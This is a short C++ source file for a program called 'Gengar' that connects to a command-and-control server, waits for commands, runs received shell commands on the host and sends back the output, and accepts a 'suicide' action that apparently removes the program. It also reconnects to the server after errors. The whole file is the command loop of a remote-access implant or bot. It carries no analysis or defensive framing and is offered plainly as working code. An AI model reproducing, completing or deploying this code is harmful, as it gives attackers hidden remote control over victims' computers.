#include "gengar.h"

void Gengar::ListenForCommand()
{
	constexpr auto TYPE_CONTENT_DELIMITER = ':';
	while (true)
	{
		try
		{
			std::string cmd = m_client.Receive();
			size_t delimiter_index = cmd.find(TYPE_CONTENT_DELIMITER);

			if (delimiter_index == std::string::npos)
				m_client.Send("Invalid command.");
			else
			{
				std::string type = cmd.substr(0, delimiter_index);
				std::string content = cmd.substr(delimiter_index + 1);
				RouteCommand(type, content);
			}
		}
		catch (boost::system::system_error&)
		{
			ConnectToCnc();
			ListenForCommand();
		}
	}
}

void Gengar::RouteCommand(std::string type, std::string content)
{
	std::string output;

	if (type == "shell")
		output = m_machine.RunShellCommand(content);
	else if (type == "action" && content == "suicide")
		m_machine.Suicide();
	else
		output = "Unknown command type.";
	m_client.Send(output);
}

void Gengar::ConnectToCnc() { m_client.Connect(); }
